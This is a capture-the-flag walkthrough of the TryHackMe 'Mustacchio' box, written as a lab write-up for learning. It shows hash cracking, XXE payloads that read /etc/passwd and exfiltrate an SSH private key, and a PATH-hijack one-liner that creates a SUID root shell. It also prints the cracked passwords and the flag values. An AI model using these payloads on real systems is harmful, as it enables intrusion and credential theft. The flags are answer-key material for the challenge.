| Category          | Details                                             |
|-------------------|-----------------------------------------------------|
| 📝 **Name**       | [Mustacchio](https://tryhackme.com/room/mustacchio) |  
| 🏷 **Type**       | THM Challenge                                       |
| 🖥 **OS**         | Linux                                               |
| 🎯 **Difficulty** | Easy                                                |
| 📁 **Tags**       | XXE, LFI, PATH hijack                               |

## Task 1: Mustacchio

### What is the user flag?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Mustacchio]
└─$ nmap -sS -sC -sV -p-  $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-02 08:41 +0100
Nmap scan report for 10.80.131.199
Host is up (0.039s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Enumerate web application running at port 80
```
┌──(magicrc㉿perun)-[~/attack/THM Mustacchio]
└─$ feroxbuster --url http://$TARGET/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,log,bak
<SNIP>
200      GET        1l       15w     8204c http://10.80.131.199/custom/js/users.bak
<SNIP>
```
`feroxbuster` has discovered `users.bak` file.

#### Download `users.bak` file
```
┌──(magicrc㉿perun)-[~/attack/THM Mustacchio]
└─$ curl http://$TARGET/custom/js/users.bak --output -
��0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b 
```
It seems that it could contain SHA1 hashed password for user `admin`. 

#### Crack discovered hash using `hashcat`
```
┌──(magicrc㉿perun)-[~/attack/THM Mustacchio]
└─$ hashcat -m 100 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b /usr/share/wordlists/rockyou.txt --quiet
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19
```

#### Use discovered credentials to access admin panel running at port 8765
```
┌──(magicrc㉿perun)-[~/attack/THM Mustacchio]
└─$ curl -L -c cookies.txt http://$TARGET:8765/auth/login.php -d 'user=admin&pass=bulldog19&submitted=1'
<SNIP>
    <script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
  }
</script>
</head>
<body>

    <!-- Barry, you can now SSH in using your key!-->
<SNIP>
        <h3>Add a comment on the website.</h3>

        <form action="" method="post" class="container d-flex flex-column align-items-center justify-content-center">
            <textarea id="box" name="xml" rows="10" cols="50"></textarea><br/>
            <input type="submit" id="sub" onclick="checktarea()" value="Submit"/>
        </form>
<SNIP>
```
From analysis of HTML / JS code when can see that:
- We could add a comment in form of XML
- There is some example in `/auth/dontforget.bak`
- User Barry can access target over SSH using private key

#### Access `/auth/dontforget.bak`
```
┌──(magicrc㉿perun)-[~/attack/THM Mustacchio]
└─$ curl -b cookies.txt http://$TARGET:8765/auth/dontforget.bak                                         
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```
It seems that we have found example of comment XML.

#### Use discovered XML structure to create a comment
```
┌──(magicrc㉿perun)-[~/attack/THM Mustacchio]
└─$ curl -b cookies.txt http://$TARGET:8765/home.php -d 'xml=<?xml version="1.0" encoding="UTF-8"?><comment><name>Joe Hamd</name><author>Barry Clad</author><com>Test</com></comment>'
<SNIP>
        <h3>Comment Preview:</h3><p>Name: Joe Hamd</p><p>Author : Barry Clad</p><p>Comment :<br> Test<p/>    </section>
<SNIP>
```
We can see that our XML has been rendered, and thus this opens XXE surface of attack.

#### Try using XXE to include `/etc/passwd` 
```
┌──(magicrc㉿perun)-[~/attack/THM Mustacchio]
└─$ PAYLOAD=$(echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY lfi SYSTEM "file:///etc/passwd">]><comment><name>Joe Hamd</name><author>Barry Clad</author><com>\nLFI\n&lfi;\nLFI\n</com></comment>' | jq -sRr @uri)
curl -s -b cookies.txt http://$TARGET:8765/home.php -d "xml=$PAYLOAD" | sed -n '/^LFI$/,/^LFI$/{             
  /^LFI$/d
  p
}'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash
```
Content of `/etc/passwd` proofs XXE vulnerability.

#### Prepare LFI exploit using discovered XXE vulnerability
```
{ cat <<'EOF'> lfi.sh
PAYLOAD=$(echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY lfi SYSTEM "file://'${1}'">]><comment><name>Joe Hamd</name><author>Barry Clad</author><com>\nLFI\n&lfi;\nLFI\n</com></comment>' | jq -sRr @uri)
curl -s -b cookies.txt http://$TARGET:8765/home.php -d "xml=$PAYLOAD" | sed -n '/^LFI$/,/^LFI$/{             
  /^LFI$/d
  p
}'
EOF
} && chmod +x lfi.sh
```

#### Exfiltrate user's `barry` private SSH key 
```
┌──(magicrc㉿perun)-[~/attack/THM Mustacchio]
└─$ ./lfi.sh /home/barry/.ssh/id_rsa > barry.id_rsa && chmod 600 barry.id_rsa && cat barry.id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
<SNIP>
```
Since key is encrypted we need to break encryption.

#### Break SSH key encryption
```
┌──(magicrc㉿perun)-[~/attack/THM Mustacchio]
└─$ ssh2john barry.id_rsa  > barry.id_rsa.hash && \
john barry.id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (barry.id_rsa)     
1g 0:00:00:02 DONE (2026-01-02 21:51) 0.4545g/s 1350Kp/s 1350Kc/s 1350KC/s urieljr.k..urielfabricio07
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

#### Gain initial foothold over SSH using private key
```
┌──(magicrc㉿perun)-[~/attack/THM Mustacchio]
└─$ ssh -i barry.id_rsa barry@$TARGET
Enter passphrase for key 'barry.id_rsa': 
<SNIP>
barry@mustacchio:~$ id
uid=1003(barry) gid=1003(barry) groups=1003(barry)
```

#### Capture user flag
```
barry@mustacchio:~$ cat /home/barry/user.txt 
62d77a4d5f97d47c5aa38b3b2651b831
```

### What is the root flag?

#### Discover unknown `live_log` SUID binary in `/home/joe`
```
barry@mustacchio:~$ ls -la /home/joe/live_log 
-rwsr-xr-x 1 root root 16832 Jun 12  2021 /home/joe/live_log
```

#### Exfiltrate and analyze it with `Binary Ninja`
![Binary ninja](images/binary_ninja.png)

We can see `tail -f /var/log/nginx/access.log` is being call by `system` function. As `tail` is being called without absolute path, we could easily exploit by hijacking PATH and providing malicious version of `tail`.

#### Hijack PATH to inject `tail` root shell spawner
```
barry@mustacchio:~$ echo '/bin/cp /bin/bash /tmp/root_shell && /bin/chmod +s /tmp/root_shell' > tail && \
chmod +x tail && \
PATH=/home/barry:$PATH /home/joe/live_log && \
echo && \
/tmp/root_shell -p
Live Nginx Log Reader
root_shell-4.3# id
uid=1003(barry) gid=1003(barry) euid=0(root) egid=0(root) groups=0(root),1003(barry)
```

#### Capture root flag
```
root_shell-4.3# cat /root/root.txt 
3223581420d906c4dd1a5f9b530393a5
```